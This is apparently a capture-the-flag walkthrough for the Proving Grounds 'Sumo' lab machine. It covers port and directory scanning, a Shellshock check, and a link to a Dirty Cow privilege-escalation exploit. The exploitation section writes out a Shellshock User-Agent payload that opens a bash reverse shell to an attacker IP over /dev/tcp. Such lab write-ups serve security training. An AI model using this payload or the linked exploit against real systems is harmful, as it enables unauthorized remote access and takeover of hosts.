---
layout: default
title: Sumo
parent: Proving Grounds Play
nav_order: 7
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sumo]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.222.87
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 22:55 EDT
Nmap scan report for 192.168.222.87
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.23 seconds

```

# Enumeration

---

## 80 - HTTP

Gobuster returns _/cgi-bin_ directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ gobuster dir -u http://192.168.222.87 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 80 -f -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.222.87
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/11/03 22:56:32 Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 290]
/icons/               (Status: 403) [Size: 288]
/.html/               (Status: 403) [Size: 288]
/doc/                 (Status: 403) [Size: 286]

```

Rerun Gobuster against the _/cgi-bin_ directory and locate a _/test_ directory.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ gobuster dir -u http://192.168.222.87/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 80 -f -x php,txt,html
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.222.87/cgi-bin
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,html
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/11/03 22:59:33 Starting gobuster in directory enumeration mode
===============================================================
/.html/               (Status: 403) [Size: 296]
/local.txt/           (Status: 500) [Size: 619]
/test/                (Status: 200) [Size: 14]

```

Run nmap script for shellshock against

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sumo]
└─$ sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/test 192.168.222.87
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 23:01 EDT
Nmap scan report for 192.168.222.87
Host is up (0.054s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

# Exploitation

---

## Shellshock

Intercept a GET request to /cgi-bin/test in Burp and send to Repeater

![burp1](../../../assets/images/ctfs/proving_grounds/sumo/burp1.png)

Add the bash reverse shell one-liner to the User-Agent header in the GET request.

```bash
User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/192.168.45.217/9001 0>&1
```

![burp2](../../../assets/images/ctfs/proving_grounds/sumo/burp2.png)

Get a reverse shell back in our netcat listener.

![shell](../../../assets/images/ctfs/proving_grounds/sumo/shell.png)

# Post-Exploitation

---

## Dirty Cow Kernel Exploit

[Dirty Cow kernel exploit](https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54)

![dirty](../../../assets/images/ctfs/proving_grounds/sumo/dirty.png)
